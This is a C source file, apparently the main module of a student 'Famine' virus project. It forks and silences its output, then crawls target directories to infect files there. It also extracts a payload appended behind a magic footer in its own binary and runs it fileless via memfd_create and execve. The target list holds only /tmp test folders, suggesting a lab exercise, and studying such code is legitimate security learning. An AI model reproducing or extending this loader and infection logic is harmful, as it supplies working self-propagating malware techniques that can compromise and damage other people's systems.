/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/14 18:25:07 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/mman.h>

int	mute_outputs()
{
	int	fd = open("/dev/null", O_RDONLY);
	if (fd == -1)
		return (-1);

	if (dup2(fd, STDOUT_FILENO) == -1
		|| dup2(fd, STDERR_FILENO) == -1)
	{
		close(fd);
		return (-1);
	}

	close(fd);
	return (0);
}

t_footer	get_footer(const char *path)
{
	int	fd = open(path, O_RDONLY);

	lseek(fd, -sizeof(t_footer), SEEK_END);

	t_footer	footer;
	read(fd, &footer, sizeof(footer));
	close(fd);
	return (footer);
}

int	extract_payload(const char *path, uint8_t **data, uint64_t *size)
{
	t_footer	footer = get_footer(path);

	if (footer.magic != FOOTER_MAGIC)
		return (-1);

	int	fd = open(path, O_RDONLY);

	*size = footer.payload_size;

	lseek(fd, -(sizeof(t_footer) + *size), SEEK_END);

	*data = malloc(*size);
	read(fd, *data, *size);

	close(fd);
	return (0);
}

int	exec_payload(t_ctx *ctx, uint8_t *data, uint64_t size)
{
	int fd = syscall(SYS_memfd_create, "payload", 0);
	write(fd, data, size);
	free(data);

	char path[256] = {0};
	sprintf(path, "/proc/self/fd/%d", fd);

	pid_t pid = fork();
	if (pid == 0)
	{
		execve(path, ctx->av, ctx->envp);
		exit(0);
	}
	else
		wait(NULL);
	return (0);
}

/*
	Goes over all target directories and infects them
*/
int	crawl(t_ctx *ctx)
{
	const char	*TARGET_DIRS[] = {
		"/tmp/test",
		"/tmp/test2"
	};
	#define DIRS_COUNT (sizeof(TARGET_DIRS) / sizeof(char *))

	for (size_t i = 0; i < DIRS_COUNT; i++)
		if (crawl_dir(TARGET_DIRS[i], ctx) == -1)
			return (-1);
	return (0);
}

int	main(int ac, char **av, char **envp)
{
	(void)ac;
	t_ctx	ctx = {0};

	ctx.av = av;
	ctx.envp = envp;
	readlink("/proc/self/exe", ctx.exec_path, sizeof(ctx.exec_path));

	int	pid = fork();
	if (pid == -1)
		return (0);
	else if (pid != 0)
	{
		uint8_t		*buf;
		uint64_t	size;

		if (extract_payload(ctx.exec_path, &buf, &size) == 0)
			exec_payload(&ctx, buf, size);
		return (0);
	}

	if (mute_outputs() == -1)
		return (0);

	if (crawl(&ctx) == -1)
		return (0);
	return (0);
}
